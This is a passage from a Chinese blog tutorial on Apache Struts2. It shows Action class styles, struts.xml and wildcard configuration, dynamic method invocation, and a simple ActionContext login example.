class="hljs-name">struts</span>&gt;</span><br></code></pre></td></tr></table></figure><h2 id="Action的配置"><a href="#Action的配置" class="headerlink" title="Action的配置"></a>Action的配置</h2><h3 id="实现Action控制类"><a href="#实现Action控制类" class="headerlink" title="实现Action控制类"></a>实现Action控制类</h3><p>Action类的书写格式有三种方法</p><p><strong>方法一</strong>: Action类可以不继承特殊的类或不实现任何特殊的接口或者父类，仅仅是一个POJO，即简单的Java对象（Plain Ordinary Java Object） ，要有一个公共的无参的构造方法和一个execute方法</p><p>代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> cn.itcast.action;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">HelloWorldAction</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">execute</span> <span class="hljs-params">()</span></span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;success&quot;</span>;<br>    <br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>方法二</strong>: 创建一个类去实现指定的一个接口:<code>com.opensymphony.xwork2.Action</code></p><p>这个接口中只有一个抽象方法 </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span> String <span class="hljs-title">execute</span><span class="hljs-params">()</span><span class="hljs-keyword">throws</span> Exception</span>;<br></code></pre></td></tr></table></figure><p>同时还有5个String类型的静态属性：ERROR、SUCCESS、INPUT、NONE、LOGIN</p><p>常量：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> String SUCCESS = <span class="hljs-string">&quot;success&quot;</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> String NONE = <span class="hljs-string">&quot;none&quot;</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> String ERROR = <span class="hljs-string">&quot;error&quot;</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> String INPUT = <span class="hljs-string">&quot;input&quot;</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> String LOGIN = “login”;<br></code></pre></td></tr></table></figure><p>代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> cn.itcast.action;<br><br><span class="hljs-keyword">import</span> com.opensymphony.xwork2.Action;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">HelloWorldAction</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">Action</span></span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">execute</span> <span class="hljs-params">()</span><span class="hljs-keyword">throws</span> Exception</span>&#123;<br>    <span class="hljs-keyword">return</span> SUCCESS;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>方法三</strong>:   继承一个指定的父类:<code>com.opensymphony.xwork2.ActionSupport</code></p><p>   ActionSupport类本身实现了Action接口，是Struts2中默认的Action接口的实现类，所以继承ActionSupport就相当于实现了Acton接口，并提供了数据的校验。</p><p>代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> cn.itcast.action;<br><br><span class="hljs-keyword">import</span> com.opensymphony.xwork2.ActionSupport;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">HelloWorldAction</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">ActionSupport</span></span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">execute</span> <span class="hljs-params">()</span><span class="hljs-keyword">throws</span> Exception</span>&#123;<br>    <span class="hljs-keyword">return</span> SUCCESS;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>struts.xml配置</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">package</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;struts2_1&quot;</span> <span class="hljs-attr">namespace</span>=<span class="hljs-string">&quot;/&quot;</span> <span class="hljs-attr">extends</span>=<span class="hljs-string">&quot;struts-default&quot;</span>&gt;</span> <br>   <span class="hljs-comment">&lt;!-- 使用pjo完成action操作 --&gt;</span><br>   <span class="hljs-tag">&lt;<span class="hljs-name">action</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;action1&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;cn.itcast.action.Demo1Action&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">result</span> &gt;</span>/success.jsp<span class="hljs-tag">&lt;/<span class="hljs-name">result</span>&gt;</span><br>   <span class="hljs-tag">&lt;/<span class="hljs-name">action</span>&gt;</span><br>   <span class="hljs-comment">&lt;!-- 实现Action类来完成action操作 --&gt;</span><br>   <span class="hljs-tag">&lt;<span class="hljs-name">action</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;action2&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;cn.itcast.action.Demo2Action&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">result</span> &gt;</span>/success.jsp<span class="hljs-tag">&lt;/<span class="hljs-name">result</span>&gt;</span><br>   <span class="hljs-tag">&lt;/<span class="hljs-name">action</span>&gt;</span><br>   <span class="hljs-comment">&lt;!-- 通过继承ActionSupport来完成action操作 --&gt;</span><br>   <span class="hljs-tag">&lt;<span class="hljs-name">action</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;action3&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;cn.itcast.action.Demo3Action&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">result</span> &gt;</span>/success.jsp<span class="hljs-tag">&lt;/<span class="hljs-name">result</span>&gt;</span><br>   <span class="hljs-tag">&lt;/<span class="hljs-name">action</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">package</span>&gt;</span><br></code></pre></td></tr></table></figure><p>在开发中，第三种方法经常用到</p><h3 id="通配符配置Action类"><a href="#通配符配置Action类" class="headerlink" title="通配符配置Action类"></a>通配符配置Action类</h3><p>先写一下常规写法</p><p>新建一个BookAction类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> cn.itcast.action;<br><br><span class="hljs-keyword">import</span> com.opensymphony.xwork2.ActionSupport;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">BookAction</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">ActionSupport</span></span>&#123;<br><br><span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">add</span><span class="hljs-params">()</span></span>&#123;<br>System.out.println(<span class="hljs-string">&quot;Book add&quot;</span>);<br><span class="hljs-keyword">return</span> SUCCESS;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">delete</span><span class="hljs-params">()</span></span>&#123;<br>System.out.println(<span class="hljs-string">&quot;Book delete&quot;</span>);<br><span class="hljs-keyword">return</span> SUCCESS;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">update</span><span class="hljs-params">()</span></span>&#123;<br>System.out.println(<span class="hljs-string">&quot;Book update&quot;</span>);<br><span class="hljs-keyword">return</span> SUCCESS;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">find</span><span class="hljs-params">()</span></span>&#123;<br>System.out.println(<span class="hljs-string">&quot;Book find&quot;</span>);<br><span class="hljs-keyword">return</span> SUCCESS;<br>&#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>book.jsp</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;/FirstStruts3/book/add&quot;</span>&gt;</span>book add<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">br</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;/FirstStruts3/book/delete&quot;</span>&gt;</span>book delete<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">br</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;/FirstStruts3/book/update&quot;</span>&gt;</span>book update<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">br</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;/FirstStruts3/book/find&quot;</span>&gt;</span>book find<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">br</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br></code></pre></td></tr></table></figure><p>在struts.xml配置</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">package</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;struts2_2&quot;</span> <span class="hljs-attr">namespace</span>=<span class="hljs-string">&quot;/book&quot;</span> <span class="hljs-attr">extends</span>=<span class="hljs-string">&quot;struts-default&quot;</span>&gt;</span> <br>   <span class="hljs-comment">&lt;!--常规Action配置--&gt;</span><br>   <span class="hljs-tag">&lt;<span class="hljs-name">action</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;add&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;cn.itcast.action.BookAction&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;add&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">result</span> &gt;</span>/success.jsp<span class="hljs-tag">&lt;/<span class="hljs-name">result</span>&gt;</span><br>   <span class="hljs-tag">&lt;/<span class="hljs-name">action</span>&gt;</span><br>   <span class="hljs-tag">&lt;<span class="hljs-name">action</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;delete&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;cn.itcast.action.BookAction&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;delete&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">result</span> &gt;</span>/success.jsp<span class="hljs-tag">&lt;/<span class="hljs-name">result</span>&gt;</span><br>   <span class="hljs-tag">&lt;/<span class="hljs-name">action</span>&gt;</span><br>   <span class="hljs-tag">&lt;<span class="hljs-name">action</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;update&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;cn.itcast.action.BookAction&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;update&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">result</span> &gt;</span>/success.jsp<span class="hljs-tag">&lt;/<span class="hljs-name">result</span>&gt;</span><br>   <span class="hljs-tag">&lt;/<span class="hljs-name">action</span>&gt;</span><br>   <span class="hljs-tag">&lt;<span class="hljs-name">action</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;find&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;cn.itcast.action.BookAction&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;find&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">result</span> &gt;</span>/success.jsp<span class="hljs-tag">&lt;/<span class="hljs-name">result</span>&gt;</span><br>   <span class="hljs-tag">&lt;/<span class="hljs-name">action</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">package</span>&gt;</span><br></code></pre></td></tr></table></figure><p>跑一下项目，都打印出来了<br><img src="https://img-blog.csdnimg.cn/20210326113943563.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>在使用struts2时，每一个action都需要配置，每一个action里面的方法以及其返回到的界面都需要配置，如果一个一个配置，就太麻烦了，这里我们可以约定一些命名规范，然后再struts.xml里面使用通配符配置。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">package</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;struts2_2&quot;</span> <span class="hljs-attr">namespace</span>=<span class="hljs-string">&quot;/book&quot;</span> <span class="hljs-attr">extends</span>=<span class="hljs-string">&quot;struts-default&quot;</span>&gt;</span> <br>   <span class="hljs-comment">&lt;!--使用通配符的Action配置--&gt;</span><br>   <span class="hljs-tag">&lt;<span class="hljs-name">action</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;*&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;cn.itcast.action.BookAction&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;&#123;1&#125;&quot;</span>&gt;</span><br>   <span class="hljs-comment">&lt;!--&#123;1&#125;代表匹配一个*--&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">result</span> &gt;</span>/success.jsp<span class="hljs-tag">&lt;/<span class="hljs-name">result</span>&gt;</span><br>   <span class="hljs-tag">&lt;/<span class="hljs-name">action</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">package</span>&gt;</span><br></code></pre></td></tr></table></figure><p>也可以成功<br><img src="https://img-blog.csdnimg.cn/20210326114605767.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h3 id="Action的动态方法调用"><a href="#Action的动态方法调用" class="headerlink" title="Action的动态方法调用"></a>Action的动态方法调用</h3><p>在实际生活中，Action太多不便管理，为了减少Action，通常在一个Action中编写不同的方法处理不同的请求，如编写LoginAction，其中login()方法处理登陆请求，register()方法处理注册请求，此时可以采用动态方法调用来处理。</p><p>在使用动态方法调用时，在Action的名字中使用<code>!</code>符号来标识要调用方法的名称，语法格式如下：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;Action名称!方法名称&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure><p>使用动态方法调用将请求提交给Action时，表单中的每个按钮提交事件都交给同一个Action，只是对应Action中的不同方法。只需要在struts.xml中只要配置该Action</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">action</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;Action名字&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;包名.Action类名&quot;</span>&gt;</span><br> &lt;result&quot;&gt;/test.jsp<span class="hljs-tag">&lt;/<span class="hljs-name">result</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">action</span>&gt;</span><br></code></pre></td></tr></table></figure><p>当开启动态方法调用功能时，应当将下面的常量置为true</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!-- 动态方法调用是否开启，默认是关闭的 --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">constant</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;struts.enable.DynamicMethodInvocation&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;false&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">constant</span>&gt;</span><br></code></pre></td></tr></table></figure><p>不推荐使用动态方法调用，因为会存在安全隐患。</p><h2 id="访问Servlet-API的方法"><a href="#访问Servlet-API的方法" class="headerlink" title="访问Servlet API的方法"></a>访问Servlet API的方法</h2><h3 id="通过ActionContext类访问"><a href="#通过ActionContext类访问" class="headerlink" title="通过ActionContext类访问"></a>通过ActionContext类访问</h3><p>truts2提供了ActionContext类，struts2可以通过该类来实现与Servlet API的访问。</p><p>ActionContext类提供了如下几种方法：<br>| 方法说明                             | 功能描述                                                     |<br>| ———————————— | ———————————————————— |<br>| Object get(Object key)               | 类似于调用HttpServletRequest的getAttribute(String name)方法  |<br>| Map getApplication()                 | 返回一个Map对象，该对象模拟了该应用的ServletContext实例      |<br>| static ActionContext getContext()    | 这是个静态方法 获取系统的ActionContext实例                   |<br>| Map getParameters()                  | 获取所有的请求参数，类似于调用HttpServletRequest对象的getParameterMap()方法 |<br>| Map getSession（）                   | 返回一个Map对象，该对象模拟了HttpSession 实例                |<br>| void setApplication(Map application) | 传入一个Map实例，将Map实例的key-value转换成application的属性名-值。 |<br>| void setSession(Map session)         | 传入一个Map实例，将Map实例的key-value转换成application的属性名-值。 |</p><p>实例1：通过ActionContext类实现登陆</p><p>LoginAction.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> cn.itcast.action;<br><span class="hljs-keyword">import</span> com.opensymphony.xwork2.ActionContext;<br><span class="hljs-keyword">import</span> com.opensymphony.xwork2.ActionSupport;<br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">LoginAction</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">ActionSupport</span></span>&#123;<br><span class="hljs-keyword">private</span> String username;<br><span class="hljs-keyword">private</span> String password;<br><br><span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">getUsername</span><span class="hljs-params">()</span> </span>&#123;<br><span class="hljs-keyword">return</span> username;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setUsername</span><span class="hljs-params">(String username)</span> </span>&#123;<br><span class="hljs-keyword">this</span>.username = username;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">getPassword</span><span class="hljs-params">()</span> </span>&#123;<br><span class="hljs-keyword">return</span> password;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setPassword</span><span class="hljs-params">(String password)</span> </span>&#123;<br><span class="hljs-keyword">this</span>.password = password;<br>&#125;<br>    <br><span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">execute</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br>ActionContext context=ActionContext.getContext();<br><span class="hljs-keyword">if</span>(<span class="hljs-string">&quot;admin&quot;</span>.equals(username)&amp;&amp;<span class="hljs-string">&quot;123456&quot;</span>.equals(password))&#123;<br>context.put(<span class="hljs-string">&quot;username&quot;</span>, username);<br>context.put(<span class="hljs-string">&quot;password&quot;</span>, password);<br>context.put(<span class="hljs-string">&quot;success&quot;</span>, <span class="hljs-string">&quot;用户登录成功！&quot;</span>);<br><span class="hljs-keyword">return</span> SUCCESS;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>context.put(<span class="hljs-string">&quot;error&quot;</span>, <span class="hljs-string">&quot;用户登录失败！&quot;</span>);<br><span class="hljs-keyword">return</span> ERROR;<br>&#125;<br><br>&#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>web.xml</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">web-app</span> <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://java.sun.com/xml/ns/javaee&quot;</span> <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;http://java.sun.com/xml/ns/javaee http://java.sun.com/xml/ns/javaee/web-app_3_0.xsd&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;WebApp_ID&quot;</span> <span class="hljs-attr">version</span>=<span class="hljs-string">&quot;3.0&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">display-name</span>&gt;</span>FirstStruts2<span class="hljs-tag">&lt;/<span class="hljs-name">display-name</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">welcome-file-list</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">welcome-file</span>&gt;</span>index.html<span class="hljs-tag">&lt;/<span class="hljs-name">welcome-file</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">welcome-file</span>&gt;</span>index.htm<span class="hljs-tag">&lt;/<span class="hljs-name">welcome-file</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">welcome-file</span>&gt;</span>index.jsp<span class="hljs-tag">&lt;/<span class="hljs-name">welcome-file</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">welcome-file</span>&gt;</span>default.html<span class="hljs-tag">&lt;/<span class="hljs-name">welcome-file</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">welcome-file</span>&gt;</span>default.htm<span class="hljs-tag">&lt;/<span class="hljs-name">welcome-file</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">welcome-file</span>&gt;</span>default.jsp<span class="hljs-tag">&lt;/<span class="hljs-name">welcome-file</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">welcome-file-list</span>&gt;</span><br>    <span class="hljs-comment">&lt;!--配置Struts2核心过滤器--&gt;</span><br>   <span class="hljs-tag">&lt;<span class="hljs-name">filter</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">filter-name</span>&gt;</span>struts2<span class="hljs-tag">&lt;/<span class="hljs-name">filter-name</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">filter-class</span>&gt;</span>org.apache.struts2.dispatcher.ng.filter.StrutsPrepareAndExecuteFilter<span class="hljs-tag">&lt;/<span class="hljs-name">filter-class</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">filter</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">filter-mapping</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">filter-name</span>&gt;</span>struts2<span class="hljs-tag">&lt;/<span class="hljs-name">filter-name</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">url-pattern</span>&gt;</span>/*<span class="hljs-tag">&lt;/<span class="hljs-name">url-pattern</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">filter-mapping</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">web-app</span>&gt;</span><br></code></pre></td></tr></table></figure><p>struts.xml</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;</span><br><span class="hljs-comment">&lt;!-- 指定Struts2配置文件的D2T信息 --&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">struts</span> <span class="hljs-meta-keyword">PUBLIC</span></span><br><span class="hljs-meta"><span class="hljs-meta-string">&quot;-//Apache Software Foundation//DTD Struts Configuration 2.3//EN&quot;</span></span><br><span class="hljs-meta"><span class="hljs-meta-string">&quot;http://struts.apache.org/dtds/struts-2.3.dtd&quot;</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">struts</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">package</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;LoginDemo&quot;</span> <span class="hljs-attr">extends</span>=<span class="hljs-string">&quot;struts-default&quot;</span> <span class="hljs-attr">namespace</span>=<span class="hljs-string">&quot;/&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">action</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;login&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;cn.itcast.action.LoginAction&quot;</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;success&quot;</span>&gt;</span>/success.jsp<span 